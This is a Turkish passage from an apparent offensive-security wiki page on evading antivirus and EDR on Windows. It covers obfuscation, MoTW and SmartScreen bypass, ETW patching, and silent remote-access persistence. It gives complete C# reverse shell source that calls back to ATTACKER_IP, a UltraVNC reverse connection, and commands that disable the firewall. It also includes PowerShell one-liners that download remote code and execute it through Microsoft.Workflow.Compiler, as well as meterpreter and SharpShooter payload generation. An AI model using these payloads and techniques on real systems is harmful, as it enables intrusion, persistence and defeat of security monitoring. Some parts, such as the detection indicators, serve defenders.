1.  Anti-tampering'i kaldırma – ConfuserEx her *method body*'yi şifreler ve şifreyi `<Module>.cctor` statik constructor'ı içinde çözer. Ayrıca PE checksum'ı yamalar; bu nedenle yapılacak herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker’ınızı oluştururken işe yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / kontrol akışı kurtarma – *temiz* dosyayı **de4dot-cex**’e (de4dot’un ConfuserEx’i destekleyen fork’u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bayraklar:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot, control-flow flattening işlemini geri alır, özgün namespace’leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri çözer.

3.  Proxy-call stripping – ConfuserEx, decompilation işlemini daha da zorlaştırmak için doğrudan method çağrılarını hafif wrapper’larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra opak wrapper fonksiyonlar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4.  Manuel temizleme – ortaya çıkan binary'yi dnSpy altında çalıştırın; gerçek payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman bunu `<Module>.byte_0` içinde başlatılan TLV kodlamalı bir byte dizisi olarak saklar.

Yukarıdaki zincir, zararlı örneği çalıştırmaya gerek kalmadan yürütme akışını geri yükler; bu, çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak ilk değerlendirmeye almak için IOC olarak kullanılabilecek özel bir `ConfusedByAttribute` niteliği oluşturur.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, açık kaynaklı bir [LLVM](http://www.llvm.org/) derleme araçları paketi fork'u sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated kod üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework'ü tarafından oluşturulan obfuscated işlemlerden oluşan bir katman ekler; bu da uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli pe dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele yürütülebilir dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM destekli diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly code seviyesinde obfuscate eder ve böylece normal control flow'a ilişkin doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM derleyici destekli, fonksiyon başına self-masking

Tüm implantı yalnızca uyku sırasında maskelemek yerine, değiştirilmiş bir LLVM X86 backend'i seçili fonksiyonları etkin olmadıkları süre boyunca XOR ile maskeli tutabilir. Function Peekaboo PoC'si, demangle edilmiş adında `REG_` bulunan fonksiyonları seçer, son machine code etrafına konumdan bağımsız giriş/çıkış stub'ları ekler ve `.text` içine ortak bir masking handler yerleştirir; kaynak seviyesindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow dönüşümü

Bu dönüşüm, instruction selection ve optimizasyondan sonra uygulanmalıdır; çünkü her **üretilen return** talimatını kapsamalı ve tam x86 yerleşimini bilmelidir. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, son yolun eklenen epilogue'a düşmesini sağlamak için bu talimatı siler ve önceki return talimatlarını `JMP_1 handler` ile değiştirir. Her return öncesindeki derleyici tarafından üretilmiş stack/frame temizleme talimatlarını koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` fonksiyon başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue dalının daha sonra üretilecek epilogue'u hedeflemesini sağlar; elle üretilen bir near `je` için `0F 84` yazıp ardından dört baytlık MC ifadesi olan `target - address_after_je` değerini ekleyin. Handler'a yapılan çağrı ve atlamalar bunun yerine `MCInst` nesneleriyle (`CALL64pcrel32` ve `JMP_1`) üretilebilir. Hiçbir değişiklik yapmadıysa pass, seçilmeyen bir fonksiyon için `false` döndürmelidir; PoC bu durumda hatalı biçimde `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata ve pre-CRT başlatma

PoC, `.funcmeta` içinde bir XOR anahtarı ve loader tarafından yeniden konumlandırılmış fonksiyon işaretçisi ile çalışma zamanı uzunluğu içeren 16 baytlık kayıtlar tutar. C alanı `uint32_t` olsa da handler, kayıt içindeki `+8` offset'inde bir QWORD'a erişerek uzunluğu ve padding'ini tüketir ve kayıtları `0x10` artışlarla dolaşır. PE section adları yalnızca sekiz bayt olduğundan çalışma zamanı araması `.funcmet` adını görür. Harici bir patcher, yürütülebilir bir `.stub` ekler, eski entry-point RVA'sını stub içinde saklar ve `AddressOfEntryPoint` değerini yönlendirir; PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, önceden import edilmiş bir `VirtualProtect` fonksiyonunu çözümlemek için PE32+ importlarını dolaşır ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Başlatma, `gs:[0xE8]` konumunda bir sentinel ayarlar ve metadata'daki her fonksiyonu çağırır. Sürekli okunabilir prologue, fonksiyon başlangıcını `gs:[0xF0]` konumuna kaydeder, sentinel'i algılar ve henüz maskelenmemiş gövdeyi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bayt) kaydettikten sonra `[rsp+0x68]` konumundaki dönüş adresi dönüştürülmüş fonksiyonun sonunu gösterir, bu nedenle `end - start` değeri metadata kaydına yazılabilir. Tüm gövdeler maskelendikten sonra stub sentinel'i temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrı sırasında prologue, gövdenin şifresini çözmek için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken önceki tüm return talimatları doğrudan ortak handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece yeniden maskelemeden sonra handler'ın `ret` talimatı çağıranın orijinal dönüş adresini tüketir ve fonksiyon sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive ve analiz göstergeleri

Handler geçerli kaydı bulur, sabit ve görünür prologue'u (bu derlemede `0x46` bayt) atlar, geri kalan kısmı `PAGE_EXECUTE_READWRITE` olarak ayarlar, düşük anahtar baytını kullanarak baytları tek tek XOR'lar ve ardından bellek korumasını `PAGE_EXECUTE_READ` olarak ayarlar. Dolayısıyla aynı döngü, girişte şifreyi çözer ve her normal çıkışta yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarımın yüksek sinyalli göstergeleri şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- yürütülebilir bir `.stub` içindeki entry point ve bir anahtar ile yeniden konumlandırılmış `.text` işaretçileri içeren `.funcmet` section'ı;
- her metadata işaretçisi üzerinden yapılan çağrıların ardından gelen pre-CRT PEB, import table ve section table ayrıştırması;
- birbirinin aynısı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilmiş çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` konumlarına yapılan yazmaların ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed yürütülebilir sayfalara yapılan bayt bayt XOR yazmaları.

Bu, memory-scanner'dan kaçınma yöntemidir; kriptografik koruma değildir: patch'lenmiş dosya hâlâ orijinal, açık gövdeyi içerir ve debugger ile `VirtualProtect` veya XOR döngüsünde durup etkin fonksiyon dökülebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da çevrimdışı kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slotları thread-local olsa da değiştirilmiş code page'leri process-wide'dır. Bu nedenle eşzamanlı veya özyinelemeli girişler, başka bir çağrı yürütülürken talimatların yeniden toggle edilmesine yol açabilir; exception'lar ve nonlocal exit'ler de yeniden maskelemeyi atlayabilir. Sağlam bir uygulama geçişleri senkronize etmeli, `lpflOldProtect` aracılığıyla döndürülen gerçek koruma değerini geri yüklemeli, sabit kodlanmış stub uzunluklarından kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve yürütülebilir baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, yürütülebilir kod değiştirildiğinde instruction-cache tutarlılığını sağlamanın çağıranın sorumluluğunda olduğunu açıkça belirtir.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranla karşılaşmış olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak itibar tabanlı bir yaklaşım kullanır. Bu, yaygın olmayan indirmelerin SmartScreen'i tetikleyerek son kullanıcıyı uyarması ve dosyayı çalıştırmasını engellemesi anlamına gelir (ancak More Info -> Run anyway seçeneğine tıklanarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir ve internetten indirilen dosyalara, dosyanın indirildiği URL ile birlikte otomatik olarak eklenir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS değerini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir imzalama sertifikasıyla imzalanmış yürütülebilir dosyaların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını önlemenin oldukça etkili bir yolu, onları ISO gibi bir tür container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarına paketleyip SmartScreen'i bypass etmeye yönelik bir demo

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları kaydetmesine** olanak tanıyan güçlü bir logging mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanı sürecindeki **`EtwEventWrite`** fonksiyonunun herhangi bir olayı kaydetmeden hemen dönmesini sağlamak da mümkündür. Bunun için fonksiyon bellekte patch'lenerek hemen dönmesi sağlanır ve böylece ilgili süreç için ETW logging etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgiye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinden ulaşabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme yöntemi uzun zamandır biliniyor ve AV'ye yakalanmadan post-exploitation araçlarınızı çalıştırmanın hâlâ çok iyi bir yolu.

Payload diske dokunmadan doğrudan belleğe yükleneceği için yalnızca tüm süreç için AMSI'yi patch'lememiz yeterli olacaktır.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma özelliğini zaten sunuyor, ancak bunu yapmanın farklı yolları var:

- **Fork\&Run**

Bu yöntemde **yeni bir feda edilebilir süreç başlatılır**, post-exploitation kötü amaçlı kodunuz bu yeni sürece inject edilir, kod çalıştırılır ve işlem tamamlandığında yeni süreç sonlandırılır. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eyleminizde bir sorun çıkması veya yakalanmanız durumunda **implantınızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntemde post-exploitation kötü amaçlı kodu **kendi sürecine** inject edersiniz. Böylece yeni bir süreç oluşturup AV tarafından taranmasını önleyebilirsiniz; ancak payload'ınızın çalıştırılmasında bir sorun çıkarsa süreç çökebileceği için **beacon'ınızı kaybetme** olasılığınız **çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek isterseniz şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'una ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) adresinde önerildiği üzere, ele geçirilmiş makineye **saldırganın kontrolündeki SMB paylaşımında yüklü yorumlayıcı ortamına** erişim vererek diğer diller kullanılarak kötü amaçlı kod çalıştırılabilir.

SMB paylaşımındaki yorumlayıcı binary'lerine ve ortama erişim izni vererek ele geçirilmiş makinenin belleğinde bu dillerde **rastgele kod çalıştırabilirsiniz**.

Repo'ya göre: Defender script'leri taramaya devam ediyor, ancak Go, Java, PHP vb. kullanarak **statik imzaları bypass etme konusunda daha fazla esnekliğe** sahibiz. Bu dillerde obfuscate edilmemiş rastgele reverse shell script'leriyle yapılan testler başarılı oldu.

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını manipüle eder. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmaya devam etmesini sağlarken ayrıcalıklı inceleme veya düzeltme eylemlerini gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'larına handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**Bu blog gönderisinde**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, Chrome Remote Desktop'ı kurbanın bilgisayarına dağıtıp ardından bilgisayarı ele geçirmek ve kalıcılığı sürdürmek için kullanmak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine, ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Yükleyiciyi kurbanda sessizce çalıştırın (yönetici yetkisi gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına dönüp next'e tıklayın. Sihirbaz sizden yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Gerekli değişiklikleri yaparak sağlanan komutu çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI kullanmadan PIN'i ayarlar).
 

## Gelişmiş Evasion

Evasion oldukça karmaşık bir konudur. Bazen tek bir sistemdeki birçok farklı telemetry kaynağını hesaba katmanız gerekir; bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi önemle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan başka bir harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri kötü amaçlı bulduğunu kontrol etme**

Binary'nin **bölümlerini kaldırarak** Defender'ın hangi bölümü kötü amaçlı bulduğunu **tespit eden** ve o bölümü size ayıran [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
Aynı işi yapan bir diğer araç ise, hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunan [**avred**](https://github.com/dobin/avred) aracıdır.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümlerinde, yönetici olarak yükleyebileceğiniz bir **Telnet server** bulunuyordu. Şu komutu çalıştırmanız yeterliydi:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** ve şimdi **çalıştırılmasını** sağlayın:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet portunu değiştir** (stealth) ve güvenlik duvarını devre dışı bırak:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Şuradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin indirmelerini istiyorsunuz)

**HOST'TA**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanında bir parola belirleyin
- _View-Only Password_ alanında bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Ters bağlantı**

**Saldırgan**, ters bir **VNC bağlantısı** yakalamaya hazır olması için `vncviewer.exe -listen 5900` binary dosyasını **kendi host'unda çalıştırmalıdır**. Ardından, **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın.

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın; aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` komutuyla kontrol edin
- `winvnc` dosyasını aynı dizinde `UltraVNC.ini` olmadan başlatmayın; aksi hâlde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Şuradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi **lister'ı başlatın**: `msfconsole -r file.rc` ve **xml payload'ı** şu komutla **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullanın:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisini kullanma

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Güvenlik Açığı Bulunan Sürücünü Getir (BYOVD) – AV/EDR’yi Kernel Alanından Devre Dışı Bırakma

